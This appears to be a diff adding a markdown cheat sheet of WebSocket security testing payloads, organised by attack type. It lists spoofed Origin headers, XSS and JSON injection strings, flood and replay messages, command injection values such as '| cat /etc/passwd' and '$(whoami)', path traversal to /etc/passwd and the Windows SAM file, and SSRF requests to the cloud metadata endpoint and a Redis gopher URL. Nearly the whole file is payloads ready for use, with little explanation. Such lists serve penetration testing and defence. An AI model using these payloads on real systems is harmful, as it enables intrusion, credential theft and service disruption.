@@ -1,0 +1,108 @@
+# WebSocket Security Testing Payloads
+
+## Connection Hijacking
+
+### Origin Header Manipulation
+
+```
+# Test for origin-based access control
+Origin: https://evil.com
+
+# Bypass with null origin
+Origin: null
+
+# Test with local origins
+Origin: http://localhost
+Origin: http://127.0.0.1
+```
+
+### Subdomain Takeover
+
+```
+# Test subdomain wildcards
+Origin: https://subdomain.target.com
+Origin: https://target.com.evil.com
+Origin: https://target.com
+```
+
+## Message Injection
+
+### XSS via WebSocket
+
+```javascript
+{"message": "<script>alert(1)</script>"}
+{"message": "<img src=x onerror=alert(1)>"}
+{"message": "{{constructor.constructor('alert(1)')()}}"}
+```
+
+### JSON Injection
+
+```json
+{"user":"admin","role":"user","admin":true}
+{"user":"admin","role":"admin\n\u0022,\u0022balance\u0022:\u0022100000\u0022}
+```
+
+## Frame Injection
+
+```
+# Connect to different protocols
+ws://
+wss://
+
+# Test with HTTP upgrade
+GET /chat HTTP/1.1
+Host: target.com
+Upgrade: websocket
+```
+
+## Denial of Service
+
+```
+# Large message flood
+{"data":"A"*100000}
+
+# Rapid connection opening
+# (use Intruder to send multiple)
+
+# Invalid frame types
+\x00\x00\x00\x00
+```
+
+## Authentication Bypass
+
+```
+# No authentication required
+{"action":"get_user_data","user_id":1}
+
+# Session fixation
+{"action":"login","token":"attacker_controlled"}
+
+# Replay attack
+{"action":"transfer","to":"attacker","amount":1000}
+```
+
+## Command Injection (if WebSocket used for system commands)
+
+```
+{"cmd":"; ls -la"}
+{"cmd":"&& whoami"}
+{"cmd":"| cat /etc/passwd"}
+{"cmd":"`id`"}
+{"cmd":"$(whoami)"}
+```
+
+## Path Traversal
+
+```
+{"file":"../../../../etc/passwd"}
+{"file":"..\\..\\..\\windows\\system32\\config\\sam"}
+{"path":"../../../../../../../../etc/passwd"}
+```
+
+## SSRF via WebSocket
+
+```
+{"url":"http://169.254.169.254/latest/meta-data/"}
+{"url":"file:///etc/passwd"}
+{"url":"gopher://redis:6379/_INFO"}
+```
